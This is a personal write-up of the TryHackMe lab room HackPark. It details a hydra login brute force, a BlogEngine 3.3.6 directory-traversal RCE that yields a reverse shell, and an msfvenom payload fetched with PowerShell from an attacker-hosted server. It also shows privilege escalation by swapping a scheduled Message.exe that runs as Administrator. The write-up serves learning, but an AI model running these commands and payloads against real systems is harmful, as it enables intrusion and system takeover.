# HackPark — TryHackMe — ROOT (Administrator)

**Date:** 2026-10-01 → 2026-10-07 (five sessions: 27m + 25m + 15m + 30m + re-entries)
**Platform:** TryHackMe
**Outcome:** Administrator — **machine 17, Phase C room 2 of 5**
**Time:** ~1h40 total · Confidence arc 4 → 2.5 → 3.5 → 3 (final)
**Approach:** room-task-guided recon/foothold; walkthrough for trigger URL + privesc path;
Google AI for hydra syntax + creds + order-of-operations (all disclosed)
**Tools:** nmap (-Pn), hydra (http-post-form), searchsploit, BlogEngine 46353 PoC,
nc, msfvenom, python http.server, msfconsole (multi/handler), meterpreter (upload/mv)

---

## 0. TL;DR chain

nmap all-filtered → **`-Pn`** → 80 only (IIS/HTTPAPI, Windows Server 2012 R2, **8 hotfixes**)
→ park website (Pennywise) + BlogEngine login → **hydra http-post-form** (F=-string pitfall)
→ **admin:1qaz2wsx** → BlogEngine **3.3.6.0** → searchsploit → **46353.cs** → rename
`PostView.ascx`, edit LHOST+port → upload via post editor (lands in `App_Data/files`) →
trigger **`/?theme=../../App_Data/files`** → page hangs → nc 4445 → **IIS APPPOOL\Blog** →
msfvenom exe + http.server + powershell wget → **meterpreter** →
`C:\Program Files (x86)\SystemScheduler\Events` INI log: **Message.exe runs as
Administrator on schedule** → rename original + upload malicious `Message.exe` →
`nc -lvnp 4444` → scheduled run → **Administrator**

## 1. Recon

| Port | Service | Means | Therefore |
|---|---|---|---|
| (999 filtered) | — | firewall | **`-Pn` applied unaided** — nmap's own hint, Blue's lesson, transferred |
| 80 | HTTPAPI 2.0 | IIS web app | the entire attack surface |

`systeminfo` later: Windows Server 2012 R2, `6.3.9600`, **8 hotfixes** — a patch-level
museum. Noted as a hypothesis; the sweep came first anyway (it should always come first).

## 2. Vulnerability assessment (the hydra false-positive trap)

Login brute-force via `http-post-form "/path:username=^USER^&password=^PASS^:F=<fail string>"`.
Result: **"16 valid passwords"** — all false positives. The `F=Invalid credentials` string
never appears on this ASP.NET page, and hydra's rule is *no fail-string found = success*,
so every attempt "passed." Caught by instinct ("many passwords… none is the right one" —
tested against the room question). **Method: log in manually once with a wrong password,
read the exact error text, put *that* in `F=`.** ASP.NET state tokens (`__VIEWSTATE`) also
break naive replay. Creds ultimately from AI (`admin:1qaz2wsx`) — the answer was cheap;
the false-positive diagnosis is the takeaway.

## 3. Foothold (BlogEngine 3.3.6 RCE — exploit-db 46353)

1. Version check → **BlogEngine 3.3.6.0** → searchsploit → **46353.cs** (Directory
   Traversal / RCE), confirmed on exploit-db.
2. The PoC is a C# webshell: renamed to **`PostView.ascx`**, hardcoded **IP and port**
   edited (the exploit's own default: **4445** — read from the file, not assumed).
3. Uploaded through the admin post editor → lands in **`App_Data/files`**.
4. Listener up *before* trigger → **`/?theme=../../App_Data/files`** → **the page hangs**
   (= the server is busy executing your file) → nc 4445 connected → `IIS APPPOOL\Blog`.

**The one-character day:** a trigger typed without the `?` (`theme=...` as path, not
query) returned an IIS **404** and cost a session. **404 = suspect your own URL string
first; copy URLs, don't retype them.**

## 4. Shell upgrade (netcat → meterpreter)

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tun0> LPORT=1234 -f exe -o reverse.exe
python3 -m http.server 80                      # terminal 1
msfconsole: multi/handler, payload set, run    # terminal 2
target:  powershell -c wget "http://<tun0>/reverse.exe" -outfile "reverse.exe"  → run it
```

Walkthrough's command asked for `-e x64/shikata_ga_nai` on an x86 payload — msfvenom said
so out loud ("Skipping invalid encoder… outputting raw payload") and produced a working
exe anyway. **Walkthrough commands aren't gospel; the tool's warnings are the last word.**
(x86 meterpreter runs fine on 64-bit Windows via WOW64.)

*User addition, refined:* the run went upgrade-first — meterpreter, then hunt for the
service. Worth stating plainly: **the sweep needs no meterpreter** — every command in §5
runs from a plain netcat `cmd` shell. What meterpreter actually bought here was the file
operations for the hijack itself (`mv`, `upload`) and a stable session. When AV eats
meterpreter (Wreath), enumeration still has to work from a raw shell — so treat the
upgrade as convenience, never as prerequisite.

## 5. Privilege escalation (SystemScheduler — the manual sweep block)

The gap this room exposed: *which commands find this?* They didn't exist in notes or
writeups. They do now — **the Windows sweep, in order, before any shortcut:**

```
whoami  &  whoami /groups          # whose skin am I wearing
tasklist /svc                      # running processes ↔ services
sc query state= all                # every service, running or not
sc qc <name>                       # binPath, user, start mode per service
schtasks /query /fo LIST /v        # scheduled tasks + run-as user
browse C:\Program Files*           # third-party services/schedulers + writable dirs?
PowerUp Invoke-AllChecks           # automated LAST, after hypotheses
```

**The vector:** `C:\Program Files (x86)\SystemScheduler\Events` — writable, and its
`20198415519.INI_LOG.txt` reads:

```
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
```

**Message.exe runs on a schedule, as Administrator, from a directory I can write.**

```
meterpreter > mv Message.exe message1.exe     # keep the original
meterpreter > upload Message.exe              # msfvenom reverse shell, same name
Kali: nc -lvnp 4444                           # the schedule fires it → Administrator
```

## 6. Misses and dead ends

- **hydra false positives** (above) — condition string unverified; creds came from AI
  instead of the fix. Rule: *escalate for the fix, never accept the answer.*
- **Missing `?` → 404 → one session lost.** URL hygiene: copy, don't type.
- **Privesc sweep bypassed — twice now** (Skynet's crontab, this box). Root cause was
  honest: the commands weren't in any searchable record. Countermeasure: the sweep block
  in §5 — on Relevant, **grep hackpark.md before opening any walkthrough.** That's the deal.
- **Walkthrough msfvenom flags** — encoder/arch mismatch, self-corrected by the tool.
  Read warnings even when the output looks fine.
- **Manual (no-metasploit) privesc version declined** — logged, not contested. It matters
  at Wreath (AV eats meterpreter) and on HTB; the debt is written down.

## 7. Lessons

1. **The privesc pattern family — third member banked:** something *privileged* runs
   something *periodic* from somewhere *writable* → hijack it. Linux cron + tar wildcard
   (Skynet) · SCM service binPath (Steel Mountain) · **SystemScheduler task swap
   (HackPark)**. Same shape, three costumes.
2. **Scheduled-task logs are gold:** the INI log named the binary, the schedule, and the
   run-as user in two lines. When a third-party scheduler exists, its logs tell you
   everything.
3. **Page-hang = execution signal** for server-side webshells; no hang = code never ran.
4. **Brute-force conditions must be verified against the real app** — one manual failed
   login tells you the exact `F=` string.
5. **`?` separates path from query.** One character, one session. Copy identifiers and
   URLs; never retype from memory.
